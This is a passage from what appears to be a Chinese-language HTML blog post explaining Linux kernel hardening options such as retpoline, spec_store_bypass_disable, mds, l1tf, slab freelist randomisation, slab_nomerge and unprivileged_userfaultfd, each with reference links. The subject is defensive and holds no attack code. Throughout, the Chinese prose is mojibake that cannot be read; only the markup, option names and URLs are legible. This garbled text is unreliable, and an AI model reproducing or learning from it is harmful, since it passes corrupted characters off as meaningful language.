å™¨çš„ç¡¬ä»¶æ”¯æŒï¼ŒåŸºæœ¬æ˜¯å‘é‡æ›¿æ¢çš„æ–¹å¼ã€‚</p><p>å‚è€ƒï¼š<a href="https://zhuanlan.zhihu.com/p/86432216" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/86432216</a></p><h3 id="RESPECTRE"><a href="#RESPECTRE" class="headerlink" title="RESPECTRE"></a>RESPECTRE</h3><p><code>Pax/Grsecurity</code>å¼€å‘å‡ºçš„é˜²å¾¡å¹½çµçš„å®‰å…¨æœºåˆ¶ã€‚å®ƒæ˜¯ä¸€ä¸ªgccç¼–è¯‘å™¨æ’ä»¶ï¼Œå®ƒä¼šç†è§£ä»£ç çš„åŸå§‹å«ä¹‰å¹¶è‡ªåŠ¨çš„é‡æ„ï¼Œç”¨æ¥æ¶ˆé™¤èƒ½åŸºäºæ¨æµ‹çš„ä¾§ä¿¡é“ä¿¡æ¯ã€‚å®é™…çš„æ•ˆæœæµ‹è¯•è¡¨æ˜åªå ç”¨å†…æ ¸æ€§èƒ½çš„0.3%ã€‚</p><p>å‚è€ƒï¼š<a href="https://grsecurity.net/respectre_announce" target="_blank" rel="noopener">https://grsecurity.net/respectre_announce</a></p><h3 id="Manual-usage-of-nospec-barriers"><a href="#Manual-usage-of-nospec-barriers" class="headerlink" title="Manual usage of nospec barriers"></a>Manual usage of nospec barriers</h3><p>å†…æ ¸æä¾›çš„é€šç”¨APIç¡®ä¿åœ¨åˆ†æ”¯é¢„æµ‹çš„æƒ…å†µä¸‹è¾¹ç•Œæ£€æŸ¥æ˜¯ç¬¦åˆé¢„æœŸçš„ã€‚è¿™é‡Œä¸»è¦è®¾è®¡äº†ä¸¤ä¸ªAPI <code>nospec_ptr(ptr, lo, hi)</code>å’Œ<code>nospec_array_ptr(arr, idx, sz)</code>ï¼Œç¬¬ä¸€ä¸ªAPIä¼šé™åˆ¶ptråœ¨loå’Œhiçš„èŒƒå›´å†…ï¼Œé˜²æ­¢æŒ‡é’ˆè¶Šç•Œï¼›ç¬¬äºŒä¸ªAPIä¼šé™åˆ¶idxåªæœ‰åœ¨<code>[0,sz)</code>çš„èŒƒå›´ä¸­æ‰èƒ½è·å¾—<code>arr[idx]</code>çš„æ•°æ®ã€‚</p><p>å‚è€ƒï¼š<a href="https://lwn.net/Articles/743278/" target="_blank" rel="noopener">https://lwn.net/Articles/743278/</a></p><h3 id="X86-spectre-v2-on-RETPOLINE"><a href="#X86-spectre-v2-on-RETPOLINE" class="headerlink" title="X86: spectre_v2=on (RETPOLINE)"></a>X86: spectre_v2=on (RETPOLINE)</h3><p>è¿™æ˜¯é’ˆå¯¹å¹½çµå’Œç†”æ–­å®‰å…¨æ¼æ´çš„v2è¡¥ä¸ï¼Œå¼•å…¥äº†<code>retpoline</code>æŠ€æœ¯é€šè¿‡<code>spectre_v2</code>å‚æ•°æ§åˆ¶ã€‚å‚æ•°æœ‰å¤šä¸ªé…ç½®é€‰é¡¹ï¼Œæ€»ç»“å¦‚ä¸‹ï¼š</p><ul><li>onï¼Œè¡¨ç¤ºæ— è®ºç¡¬ä»¶å¦‚ä½•ï¼Œéƒ½å¼€å¯</li><li>offï¼Œè¡¨ç¤ºç‰©ç†ç¡¬ä»¶å¦‚ä½•ï¼Œéƒ½å…³é—­</li><li>autoï¼Œè¡¨ç¤ºå†…æ ¸æ ¹æ®å½“å‰CPU modelè‡ªåŠ¨é€‰æ‹©mitigationæ–¹æ³•ã€‚å‚è€ƒçš„å› ç´ åŒ…æ‹¬ï¼š<ul><li>cpu model</li><li>æ˜¯å¦æœ‰å¯ç”¨å¾®ç (ä¹Ÿå°±æ˜¯é’ˆå¯¹IBRSå’ŒIBPBæä¾›çš„å›ºä»¶)</li><li>å†…æ ¸é…ç½®é€‰é¡¹CONFIG_RETPOLINEæ˜¯å¦é…ç½®</li><li>ç¼–è¯‘å†…æ ¸ç”¨çš„ç¼–è¯‘å™¨æ˜¯å¦æä¾›äº†æ–°çš„ç¼–è¯‘é€‰é¡¹ï¼š-mindirect-branch=thunk-extern</li></ul></li><li>retpoline/retpoline,generic/retpoline,amd ä¸€å…±ä¸‰ç§<code>RETPOLINE</code>é€‰é¡¹ï¼Œæœ€åå¯¹åº”äº”ç§é…ç½®</li></ul><p>å‚è€ƒï¼š<a href="http://happyseeker.github.io/kernel/2018/05/31/about-spectre_v2-boot-parameters.html" target="_blank" rel="noopener">http://happyseeker.github.io/kernel/2018/05/31/about-spectre_v2-boot-parameters.html</a></p><h3 id="ARM-HARDEN-BRANCH-PREDICTOR"><a href="#ARM-HARDEN-BRANCH-PREDICTOR" class="headerlink" title="ARM: HARDEN_BRANCH_PREDICTOR"></a>ARM: HARDEN_BRANCH_PREDICTOR</h3><p>è¿™ä¸ªé…ç½®é€‰é¡¹æ˜¯ä¸ºäº†é˜»æ­¢åˆ†æ”¯é¢„æµ‹æ”»å‡»åŠ å›ºåˆ†æ”¯é¢„æµ‹ï¼Œé’ˆå¯¹CPUçš„åˆ†æ”¯é¢„æµ‹æ”»å‡»æ˜¯æ§åˆ¶åˆ†æ”¯é¢„æµ‹æ‰§è¡Œæ”»å‡»è€…ç²¾å¿ƒæ„é€ çš„åˆ†æ”¯è·¯å¾„ã€‚é€šè¿‡æ¸…é™¤å†…éƒ¨åˆ†æ”¯é¢„æµ‹çš„çŠ¶æ€å¹¶é™åˆ¶æŸäº›æƒ…å†µä¸‹çš„é¢„æµ‹é€»ï¼Œå¯ä»¥éƒ¨åˆ†ç¼“è§£è¿™ç§æ”»å‡»ã€‚</p><p>å‚è€ƒï¼š<a href="https://cateee.net/lkddb/web-lkddb/HARDEN_BRANCH_PREDICTOR.html" target="_blank" rel="noopener">https://cateee.net/lkddb/web-lkddb/HARDEN_BRANCH_PREDICTOR.html</a></p><h3 id="X86-spec-store-bypass-disable-on"><a href="#X86-spec-store-bypass-disable-on" class="headerlink" title="X86: spec_store_bypass_disable=on"></a>X86: spec_store_bypass_disable=on</h3><p>è¿™ä¸ªé…ç½®é€‰é¡¹æ§åˆ¶æ˜¯å¦å¼€å¯å¯¹<code>Speculative Store Bypass</code>çš„åŠ å›ºä»¥åŠé‡‡ç”¨ä»€ä¹ˆæ–¹å¼åŠ å›ºã€‚é…ç½®é€‰é¡¹å¦‚ä¸‹ï¼š</p><ul><li>offï¼Œè¡¨ç¤ºä¸å¼€å¯ä»»ä½•åŠ å›º</li><li>onï¼Œè¡¨ç¤ºå…¨å±€å…³é—­CPUçš„<code>Speculative Store Bypass</code>ä¼˜åŒ–</li><li>prctlï¼Œè¡¨ç¤ºä½¿ç”¨prctlè¿›è¡ŒåŠ å›º</li><li>seccompï¼Œè¡¨ç¤ºä½¿ç”¨seccompè¿›è¡ŒåŠ å›º</li><li>autoï¼Œè¡¨ç¤ºè‡ªåŠ¨é€‰æ‹©åŠ å›ºæ–¹å¼ï¼Œè‹¥ç³»ç»Ÿæ”¯æŒseccompæ¡†æ¶ï¼Œåˆ™é»˜è®¤é‡‡ç”¨ seccomp åŠ å›ºæ–¹å¼ï¼Œå¦åˆ™é‡‡ç”¨ prctl åŠ å›ºæ–¹å¼</li></ul><p>å¹½çµçš„v4ç‰ˆæœ¬å¼€å§‹åˆ©ç”¨<code>store buffer bypass</code>æ³„éœ²ä¿¡æ¯ï¼Œç°ä»£çš„CPUä¸ºäº†æå‡æ€§èƒ½éƒ½ä¼šå‡è®¾<code>store buffer</code>ä¸­ä¸å­˜åœ¨å½“å‰å†…å­˜åœ°å€çš„æ›´æ–°å€¼ï¼Œç›´æ¥å¼€å§‹æ‰§è¡Œä¹‹åçš„æŒ‡ä»¤ï¼Œå¦‚æœä¹‹åå‘ç°<code>store buffer</code>ä¸­ç¡®å®å­˜åœ¨æ›´æ–°çš„å€¼ï¼Œå°±ä¼šä¸¢å¼ƒä¹‹å‰æ‰§è¡Œçš„ç»“æœï¼Œç„¶è€Œè¿™å¯¼è‡´ä¹‹å‰æ‰§è¡Œæ—¶å·²ç»æ³„éœ²ç›¸å…³çš„ä¿¡æ¯ã€‚æ‰€ä»¥è¿™é‡Œæ¨èçš„æ˜¯ç›´æ¥å…³é—­CPUçš„<code>Speculative Store Bypass</code>ä¼˜åŒ–ã€‚</p><p>å‚è€ƒï¼š<a href="https://www.sohu.com/a/357494787_467784" target="_blank" rel="noopener">https://www.sohu.com/a/357494787_467784</a></p><h3 id="ARM-ssbd-force-on"><a href="#ARM-ssbd-force-on" class="headerlink" title="ARM: ssbd=force-on"></a>ARM: ssbd=force-on</h3><p>ä¸€ä¸ªARMæ¶æ„é’ˆå¯¹<code>Speculative Store Bypass</code>çš„åŠ å›ºé…ç½®ï¼Œæ§åˆ¶<code>Speculative Store Bypass Disable</code>çš„å¼€å…³ï¼Œå’Œx86çš„é…ç½®æ¯”è¾ƒç›¸ä¼¼ã€‚é…ç½®é€‰é¡¹å¦‚ä¸‹ï¼š</p><ul><li>force-onï¼Œæ— æ¡ä»¶å¯¹å†…æ ¸å’Œç”¨æˆ·ç©ºé—´å¼€å¯åŠ å›º</li><li>force-offï¼Œæ— æ¡ä»¶å¯¹å†…æ ¸å’Œç”¨æˆ·ç©ºé—´å…³é—­åŠ å›º</li><li>kernelï¼Œå¼€å¯å¯¹å†…æ ¸çš„åŠ å›ºï¼Œå¹¶ä¸”ä¸ºç”¨æˆ·ç©ºé—´æä¾›ç”¨æ¥åŠ å›ºçš„prctlæ¥å£ï¼Œå¯ä»¥é€‰æ‹©æ€§çš„åŠ å›ºéœ€è¦çš„åœ°æ–¹ã€‚</li></ul><p>å‚è€ƒï¼š<a href="https://lkml.org/lkml/2018/5/24/812" target="_blank" rel="noopener">https://lkml.org/lkml/2018/5/24/812</a></p><h3 id="X86-mds-full-nosmt"><a href="#X86-mds-full-nosmt" class="headerlink" title="X86: mds=full,nosmt"></a>X86: mds=full,nosmt</h3><p>MDSï¼ˆMicroarchitectural Data Samplingï¼Œå¾®æ¶æ„çš„æ•°æ®é‡‡æ ·ï¼‰æ”»å‡»æ˜¯åˆ©ç”¨å¤„ç†å™¨çš„é¢„æµ‹æ‰§è¡Œï¼Œé€šè¿‡æµ‹ä¿¡é“è·å–<code>store buffer</code>ï¼Œ<code>fill buffer</code>ï¼Œ<code>load buffer</code>ä¸­çš„æ•°æ®ã€‚é€šè¿‡è¿™ä¸ªæ”»å‡»èƒ½ä»ç”¨æˆ·ç©ºé—´è·å¾—å†…æ ¸æ•°æ®ï¼Œä½†æ˜¯ç”±äºæ”»å‡»æ— æ³•æ„é€ ç‰¹å®šçš„å†…å­˜åœ°å€ä»¥è·å–ç‰¹å®šåœ°å€å¤„çš„å†…å­˜æ•°æ®ï¼Œå› è€Œåªèƒ½é€šè¿‡é‡‡æ ·çš„æ–¹å¼è·å–æŸä¸€å†…å­˜åœ°å€å¤„å¯¹åº”çš„æ•°æ®ï¼Œæ”»å‡»è€…éœ€è¦æ”¶é›†å¤§é‡æ•°æ®æ‰æœ‰å¯èƒ½æ¨æµ‹å‡ºæ•æ„Ÿæ•°æ®ã€‚</p><p>è¿™ä¸ªé…ç½®çš„é€‰é¡¹å¦‚ä¸‹ï¼š</p><ul><li>offï¼Œè¡¨ç¤ºä¸å¼€å¯MDSçš„åŠ å›º</li><li>fullï¼Œè¡¨ç¤ºå¼€å¯CPU buffer clearï¼Œä½†æ˜¯ä¸å…³é—­SMT</li><li>full+nosmtï¼Œè¡¨ç¤ºå¼€å¯CPU buffer clearï¼ŒåŒæ—¶ä¼šå…³é—­SMT</li></ul><p>è€Œé’ˆå¯¹MDSæ”»å‡»çš„åŠ å›ºä¸»è¦æ˜¯ä»å†…æ ¸æ€åˆ‡æ¢åˆ°ç”¨æˆ·æ€æ—¶å¯¹<code>store buffer</code>ï¼Œ<code>fill buffer</code>ï¼Œ<code>load buffer</code>ç­‰ç¼“å­˜è¿›è¡Œæ¸…ç©ºï¼Œå¦å¤–è¿˜éœ€è¦é…åˆå…³é—­SMTï¼Œä»¥é˜²æ­¢åŒä¸€ä¸ªæ ¸å¿ƒä¸Šçš„è¾…åŠ©CPUé‡æ–°å¡«å……è¿™äº›ç¼“å­˜ã€‚</p><p>å‚è€ƒï¼š<a href="https://www.kernel.org/doc/html/latest/admin-guide/hw-vuln/mds.htmlï¼Œhttp://www.360doc.com/content/21/0207/15/15915859_961159696.shtml" target="_blank" rel="noopener">https://www.kernel.org/doc/html/latest/admin-guide/hw-vuln/mds.htmlï¼Œhttp://www.360doc.com/content/21/0207/15/15915859_961159696.shtml</a></p><h3 id="X86-l1tf-full-force"><a href="#X86-l1tf-full-force" class="headerlink" title="X86: l1tf=full,force"></a>X86: l1tf=full,force</h3><p>L1TFï¼ˆL1 Terminal Faultï¼ŒL1ç»ˆç«¯é”™è¯¯ï¼‰åŒæ ·æ˜¯åˆ©ç”¨CPUçš„é¢„æµ‹æ‰§è¡Œæ¥è·å–ç‰©ç†é¡µçš„å†…å®¹ã€‚Linuxä¸­ä½¿ç”¨PTEï¼ˆpage table entryï¼‰æ¥å®ç°è™šæ‹Ÿåœ°å€åˆ°ç‰©ç†åœ°å€ä¹‹é—´çš„è½¬æ¢ï¼ŒPTEå…¶ä¸­çš„PFNï¼ˆpage frame numberï¼‰å­—æ®µæè¿°å¯¹åº”<code>page frame</code>çš„ç‰©ç†åœ°å€ï¼ŒPï¼ˆpresentï¼‰è¡¨ç¤ºå½“å‰è™šæ‹Ÿåœ°å€æ˜¯å¦å­˜åœ¨å¯¹åº”çš„ç‰©ç†åœ°å€ï¼Œå³æ˜¯å¦ä¸ºè¯¥è™šæ‹Ÿåœ°å€åˆ†é…äº†å¯¹åº”çš„ physical page frameã€‚è¿›ç¨‹åœ¨ä½¿ç”¨è™šæ‹Ÿåœ°å€è®¿é—®å†…å­˜æ—¶ï¼Œä¼šé¦–å…ˆæ‰¾åˆ°è¯¥è™šæ‹Ÿåœ°å€å¯¹åº”çš„ PTEï¼Œè‹¥ P å­—æ®µä¸º 0ï¼Œåˆ™ä¼šå‘ç”Ÿ page faultï¼›è‹¥ P å­—æ®µä¸º 1ï¼Œæ ¹æ® PFN å­—æ®µçš„å€¼åœ¨ L1 data cache ä¸­å¯»æ‰¾æ˜¯å¦å­˜åœ¨ç¼“å­˜ã€‚</p><p>Intel å¤„ç†å™¨åœ¨åˆ¤æ–­ P æ ‡å¿—ä½æ˜¯å¦ä¸º 1 çš„æ—¶å€™ï¼Œåœ¨åˆ¤æ–­å°šæœªç»“æŸä¹‹å‰ä¼šé¢„æµ‹æ‰§è¡Œä¹‹åçš„ä»£ç ï¼Œå³æ ¹æ® PFN å­—æ®µçš„å€¼åœ¨ L1 data cache ä¸­å¯»æ‰¾æ˜¯å¦å­˜åœ¨ç¼“å­˜ã€‚è‹¥ç¼“å­˜å‘½ä¸­ï¼Œé‚£ä¹ˆé€šè¿‡ cache ä¾§ä¿¡é“æ”»å‡»ï¼Œæ”»å‡»è€…å°±å¯ä»¥è·å–æŸä¸€ç‰©ç†åœ°å€å¤„çš„å†…å­˜æ•°æ®ã€‚</p><p>è¿™ä¸ªé…ç½®çš„é€‰é¡¹å¦‚ä¸‹ï¼š</p><ul><li>offï¼Œè¡¨ç¤ºä¸å¼€å¯ä»»ä½•L1TFåŠ å›º</li><li>flushï¼Œè¡¨ç¤ºå¼€å¯æ¡ä»¶æ€§çš„L1D flushåŠ å›ºï¼Œå…³é—­SMT Disabling</li><li>flush+nowarnï¼ŒåŒæ ·å¼€å¯L1D flushåŠ å›ºï¼Œå…³é—­SMT Disablingï¼Œä¸ä¼šäº§ç”Ÿwaringè­¦å‘Š</li><li>flush+nosmtï¼Œè¡¨ç¤ºå¼€å¯æ¡ä»¶æ€§çš„L1D flushåŠ å›ºï¼Œå¼€å¯SMT DisablingåŠ å›º</li><li>fullï¼Œè¡¨ç¤ºå¼€å¯æ— æ¡ä»¶çš„L1D flushåŠ å›ºï¼Œå¼€å¯SMT DisablingåŠ å›º</li><li>full+forceï¼Œä¸fullæ•ˆæœç›¸åŒï¼Œä½†æ— æ³•é€šè¿‡sysfsæ¥å£åœ¨è¿è¡Œæ—¶åŠ¨æ€å¼€å¯æˆ–å…³é—­L1D flushæˆ–è€…SMT Disabling</li></ul><p>è€ƒè™‘åˆ°æ”»å‡»çš„æ¡ä»¶æ˜¯å¯¹åº”ç‰©ç†åœ°å€åœ¨L1æ•°æ®ç¼“å­˜ä¸­å‘½ä¸­ï¼Œé‚£ä¹ˆæ¯æ¬¡åœ¨åˆ‡æ¢æ—¶æŠŠç¼“å­˜æ¸…é™¤å³å¯ã€‚L1D flushæ˜¯æŒ‡åœ¨host kernelæ¯æ¬¡è¿›å…¥guestä¹‹å‰ï¼Œéƒ½æ¸…ç©ºL1çš„æ•°æ®ç¼“å­˜ï¼Œç”±äºæ¸…é™¤ç¼“å­˜ä¼šå¸¦æ¥æ€§èƒ½ä¸‹é™çš„é—®é¢˜ï¼Œæ‰€ä»¥åˆåˆ†æˆæ¡ä»¶æ€§æ¸…é™¤å’Œæ— æ¡ä»¶æ¸…é™¤ï¼Œæ— æ¡ä»¶å°±æ˜¯åº”ç”¨åˆ°æ¯æ¬¡çš„<code>VMENTER</code>éƒ½ä¼šè¿›è¡Œæ¸…é™¤ï¼Œæ¡ä»¶æ‰§è¡Œæ˜¯å½“<code>VMEXIT</code>å’Œ<code>VMENTER</code>ä¹‹é—´æ‰§è¡Œçš„ä»£ç éƒ½æ˜¯ä¸é‡è¦çš„è·¯å¾„æ—¶ï¼Œä¸ä¼šæ‰§è¡Œæ¸…é™¤æ“ä½œã€‚</p><p>å‚è€ƒï¼š<a href="https://www.kernel.org/doc/html/latest/admin-guide/hw-vuln/l1tf.htmlï¼Œhttp://www.360doc.com/content/21/0207/15/15915859_961159696.shtml" target="_blank" rel="noopener">https://www.kernel.org/doc/html/latest/admin-guide/hw-vuln/l1tf.htmlï¼Œhttp://www.360doc.com/content/21/0207/15/15915859_961159696.shtml</a></p><h3 id="SLAB-FREELIST-RANDOM"><a href="#SLAB-FREELIST-RANDOM" class="headerlink" title="SLAB_FREELIST_RANDOM"></a>SLAB_FREELIST_RANDOM</h3><p>å¼€å¯é…ç½®é€‰é¡¹ä¼šéšæœºåŒ–slabçš„freelistï¼ŒéšæœºåŒ–ç”¨äºåˆ›å»ºæ–°é¡µçš„freelistä¸ºäº†å‡å°‘å¯¹å†…æ ¸slabåˆ†é…å™¨çš„å¯é¢„æµ‹æ€§ã€‚è¿™æ ·èƒ½å¢åŠ å †æº¢å‡ºæ”»å‡»çš„éš¾åº¦ã€‚</p><p>å‚è€ƒï¼š<a href="https://cateee.net/lkddb/web-lkddb/SLAB_FREELIST_RANDOM.html" target="_blank" rel="noopener">https://cateee.net/lkddb/web-lkddb/SLAB_FREELIST_RANDOM.html</a></p><h3 id="SHUFFLE-PAGE-ALLOCATOR"><a href="#SHUFFLE-PAGE-ALLOCATOR" class="headerlink" title="SHUFFLE_PAGE_ALLOCATOR"></a>SHUFFLE_PAGE_ALLOCATOR</h3><p>å¼€å¯é…ç½®é€‰é¡¹ä¼šä½¿å¾—é¡µåˆ†é…å™¨éšæœºåˆ†é…å†…å­˜ï¼Œé¡µåˆ†é…å™¨çš„éšæœºåŒ–åˆ†é…è¿‡ç¨‹ä¼šæé«˜å†…å­˜ç«¯ç¼“å­˜æ˜ å°„çš„å¹³å‡åˆ©ç”¨ç‡ï¼Œå¹¶ä¸”éšæœºåŒ–çš„è¿‡ç¨‹ä¹Ÿèƒ½è®©é¡µé¢åˆ†é…ä¸å¯é¢„æµ‹ï¼Œèƒ½å¤Ÿæ­é…<code>SLAB_FREELIST_RANDOM</code>è®©æ•´ä¸ªåˆ†é…è¿‡ç¨‹æ›´åŠ éš¾ä»¥é¢„æµ‹ã€‚å°½ç®¡éšæœºåŒ–èƒ½æé«˜ç¼“å­˜åˆ©ç”¨ç‡ï¼Œä½†ä¼šå¯¹æ²¡æœ‰ç¼“å­˜çš„æƒ…å†µäº§ç”Ÿå½±å“ï¼Œå› æ­¤ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œåªä¼šåœ¨è¿è¡Œæ—¶æ£€æµ‹åˆ°æœ‰å†…å­˜ç¼“å­˜ä¹‹åæ‰ä¼šå¯ç”¨éšæœºåŒ–ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å†…æ ¸å‘½ä»¤è¡Œå‚æ•°<code>page_alloc.shuffle</code>å¼ºåˆ¶å¼€å¯ã€‚</p><p>å‚è€ƒï¼š<a href="https://cateee.net/lkddb/web-lkddb/SHUFFLE_PAGE_ALLOCATOR.html" target="_blank" rel="noopener">https://cateee.net/lkddb/web-lkddb/SHUFFLE_PAGE_ALLOCATOR.html</a></p><h3 id="slab-nomerge"><a href="#slab-nomerge" class="headerlink" title="slab_nomerge"></a>slab_nomerge</h3><p>é€‰é¡¹å¼€å¯ä¹‹åä¼šç¦æ­¢ç›¸è¿‘å¤§å°çš„slabåˆå¹¶ï¼Œè¿™ä¸ªèƒ½æœ‰æ•ˆé˜²å¾¡ä¸€éƒ¨åˆ†å †æº¢å‡ºçš„æ”»å‡»ï¼Œå¦‚æœslabå¼€å¯åˆå¹¶ï¼Œè¢«å †æº¢å‡ºç¯¡æ”¹çš„slabå—åˆå¹¶ä¹‹åé€šå¸¸å¯ä»¥æ‰©å¤§æ”»å‡»èŒƒå›´ï¼Œè®©æ•´ä¸ªæ”»å‡»å±å®³æ›´å¤§ã€‚</p><p>å‚è€ƒï¼š<a href="https://tails.boum.org/contribute/design/kernel_hardening/ï¼Œhttps://patchwork.kernel.org/project/kernel-hardening/patch/1497915397-93805-24-git-send-email-keescook@chromium.org/" target="_blank" rel="noopener">https://tails.boum.org/contribute/design/kernel_hardening/ï¼Œhttps://patchwork.kernel.org/project/kernel-hardening/patch/1497915397-93805-24-git-send-email-keescook@chromium.org/</a></p><h3 id="unprivileged-userfaultfd-0"><a href="#unprivileged-userfaultfd-0" class="headerlink" title="unprivileged_userfaultfd=0"></a>unprivileged_userfaultfd=0</h3><p>è¿™ä¸ªæ ‡å¿—ä½æ˜¯æ§åˆ¶ä½æƒé™ç”¨æˆ·æ˜¯å¦èƒ½ä½¿ç”¨<code>userfaultfd</code>ç³»ç»Ÿè°ƒç”¨ï¼Œæ ‡å¿—è®¾ç½®ä¸º1æ—¶ï¼Œå…è®¸ä½æƒé™ç”¨æˆ·ä½¿ç”¨ï¼Œè®¾ç½®ä¸º0æ—¶ç¦æ­¢ä½æƒé™ç”¨æˆ·ä½¿ç”¨ï¼Œåªæœ‰é«˜æƒé™ç”¨æˆ·èƒ½å¤Ÿè°ƒç”¨ã€‚<code>userfaultfd</code>æ˜¯Linuxä¸­å¤„ç†å†…å­˜é¡µé”™è¯¯çš„æœºåˆ¶ï¼Œç”¨æˆ·å¯ä»¥è‡ªå®šä¹‰å‡½æ•°å¤„ç†è¿™ç§äº‹ä»¶ï¼Œåœ¨å¤„ç†å‡½æ•°æ²¡æœ‰ç»“æŸä¹‹å‰ï¼Œç¼ºé¡µå‘ç”Ÿçš„ä½ç½®å°†ä¼šå¤„äºæš‚åœçŠ¶æ€ï¼Œè¿™ä¼šå¯¼è‡´ä¸€äº›æ¡ä»¶ç«äº‰æ¼æ´çš„åˆ©ç”¨ã€‚æ‰€ä»¥æœ€å¥½çš„åŠæ³•æ˜¯åªè®©é«˜æƒé™ç”¨æˆ·æœ‰ä½¿ç”¨çš„æƒé™ã€‚</p><p>å‚è€ƒï¼š<a href="https://patchwork.kernel.org/project/linux-fsdevel/patch/20190319030722.12441-2-peterx@redhat.com/" target="_blank" rel="noopener">https://patchwork.kernel.org/project/linux-fsdevel/patch/20190319030722.12441-2-peterx@redhat.com/</a></p><h3 id="DEBUG-LIST-SG-CREDENTIALS-NOTIFIERS-VIRTUAL"><a href="#DEBUG-LIST-SG-CREDENTIALS-NOTIFIERS-VIRTUAL" class="headerlink" title="DEBUG_{LIST,SG,CREDENTIALS,NOTIFIERS,VIRTUAL}"></a>DEBUG_{LIST,SG,CREDENTIALS,NOTIFIERS,VIRTUAL}</h3><p>è¿™ä¸€ç»„é…ç½®é€‰é¡¹ç”¨äºè°ƒè¯•å†…æ ¸ã€‚</p><ul><li><code>DEBUG_LIST</code>ï¼šç”¨äºè°ƒè¯•é“¾è¡¨æ“ä½œï¼Œå¼€å¯ä¹‹åä¼šåœ¨é“¾è¡¨æ“ä½œä¸­æ‰§è¡Œé¢å¤–æ£€æŸ¥</li><li><code>DEBUG_SG</code>ï¼šç”¨äºè°ƒè¯•SGè¡¨çš„æ“ä½œï¼Œå¼€å¯ä¹‹åä¼šæ£€æŸ¥scatter-gatherè¡¨ï¼Œè¿™ä¸ªèƒ½å¸®åŠ©å‘ç°é‚£äº›ä¸èƒ½æ­£ç¡®åˆå§‹åŒ–SGè¡¨çš„é©±åŠ¨</li><li><code>DEBUG_CREDENTIALS</code>ï¼šç”¨äºè°ƒè¯•å‡­è¯ç®¡ç†ï¼Œå¼€å¯ä¹‹åå¯¹å‡­è¯ç®¡ç†åšè°ƒè¯•æ£€æŸ¥ï¼Œè¿½è¸ª<code>task_struct</code>åˆ°ç»™å®šå‡­è¯ç»“æ„çš„æŒ‡é’ˆæ•°é‡æ²¡æœ‰è¶…è¿‡å‡­è¯ç»“æ„çš„ä½¿ç”¨ä¸Šé™</li><li><code>DEBUG_NOTIFIERS</code>ï¼šç”¨äºè°ƒè¯•é€šçŸ¥è°ƒç”¨é“¾ï¼Œå¼€å¯ä¹‹åä¼šæ£€æµ‹é€šçŸ¥è°ƒç”¨é“¾çš„åˆæ³•æ€§ï¼Œè¿™ä¸ªé€‰é¡¹å¯¹äºå†…æ ¸å¼€å‘äººå‘˜éå¸¸æœ‰ç”¨ï¼Œèƒ½ç¡®ä¿æ¨¡å—æ­£ç¡®çš„ä»é€šçŸ¥é“¾ä¸­æ³¨é”€</li><li><code>DEBUG_VIRTUAL</code>ï¼šç”¨äºè°ƒè¯•è™šæ‹Ÿå†…å­˜è½¬æ¢ï¼Œå¼€å¯ä¹‹ååœ¨å†…å­˜è½¬æ¢æ—¶ä¼šåˆæ³•æ€§æ£€æŸ¥ï¼ˆå¾…ç¡®è®¤ï¼‰</li></ul><p>å‚è€ƒï¼š<a href="https://cateee.net/lkddb/web-lkddb/DEBUG_LIST.htmlï¼Œhttps://github.com/torvalds/linux/blob/master/lib/Kconfig.debug#L1540" target="_blank" rel="noopener">https://cateee.net/lkddb/web-lkddb/DEBUG_LIST.htmlï¼Œhttps://github.com/torvalds/linux/blob/master/lib/Kconfig.debug#L1540</a></p><h3 id="BUG-ON-DATA-CORRUPTION"><a href="#BUG-ON-DATA-CORRUPTION" class="headerlink" title="BUG_ON_DATA_CORRUPTION"></a>BUG_ON_DATA_CORRUPTION</h3><p>å¼€å¯é…ç½®é€‰é¡¹ä¼šåœ¨æ£€æŸ¥åˆ°æ•°æ®æ±¡æŸ“æ—¶è§¦å‘ä¸€ä¸ªbugï¼Œå¦‚æœæƒ³è¦æ£€æŸ¥å†…æ ¸å†…å­˜ç»“æ„ä¸­çš„æ•°æ®æ±¡æŸ“å¯ä»¥å¼€å¯è¿™ä¸ªé€‰é¡¹ã€‚èƒ½æœ‰æ•ˆé˜²å¾¡ç¼“å†²åŒºæº¢å‡ºç±»æ¼æ´ã€‚</p><p>å‚è€ƒï¼š<a href="https://cateee.net/lkddb/web-lkddb/BUG_ON_DATA_CORRUPTION.html" target="_blank" rel="noopener">https://cateee.net/lkddb/web-lkddb/BUG_ON_DATA_CORRUPTION.html</a></p><h3 id="STATIC-USERMODEHELPER"><a href="#STATIC-USERMODEHELPER" class="headerlink" title="STATIC_USERMODEHELPER"></a>STATIC_USERMODEHELPER</h3><p>è¿™ä¸ªé€‰é¡¹ä¼šå¼ºåˆ¶æ‰€æœ‰çš„<code>usermodehelper</code>é€šè¿‡å•ä¸€çš„äºŒè¿›åˆ¶ç¨‹åºè°ƒç”¨ã€‚åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œå†…æ ¸ä¼šé€šè¿‡<code>usermodehelper</code>çš„å†…æ ¸æ¥å£è°ƒç”¨ä¸åŒçš„ç”¨æˆ·ç©ºé—´ç¨‹åºï¼Œå…¶ä¸­çš„ä¸€äº›ä¼šåœ¨å†…æ ¸ä»£ç ä¸­é™æ€å®šä¹‰æˆ–è€…ä½œä¸ºå†…æ ¸é…ç½®é€‰é¡¹ã€‚ç„¶è€Œï¼Œå…¶ä¸­çš„å¦å¤–ä¸€äº›æ˜¯åœ¨è¿è¡Œæ—¶åŠ¨æ€åˆ›å»ºçš„æˆ–è€…åœ¨å†…æ ¸å¯åŠ¨ä¹‹åèƒ½ä¿®æ”¹ã€‚ä¸ºäº†å¢å¼ºå®‰å…¨æ€§ï¼Œä¼šé‡å®šå‘æ‰€æœ‰çš„è°ƒç”¨åˆ°ä¸€ä¸ªç‰¹å®šçš„ä¸èƒ½æ”¹å˜çš„äºŒè¿›åˆ¶ç¨‹åºä¸Šï¼Œè¿™ä¸ªç¨‹åºçš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯éœ€è¦è¢«æ‰§è¡Œçš„ç”¨æˆ·ç©ºé—´ç¨‹åºã€‚</p><p>å‚è€ƒï¼š<a href="https://patchwork.kernel.org/project/kernel-hardening/patch/20170116165044.GC29693@kroah.com/" target="_blank" rel="noopener">https://patchwork.kernel.org/project/kernel-hardening/patch/20170116165044.GC29693@kroah.com/</a></p><h3 id="LOCKDOWN-LSM"><a href="#LOCKDOWN-LSM" class="headerlink" title="LOCKDOWN_LSM"></a>LOCKDOWN_LSM</h3><p>è¿™ä¸ªç›¸å…³çš„<code>locked_down</code>èƒ½è®©LSMï¼ˆLinux Security 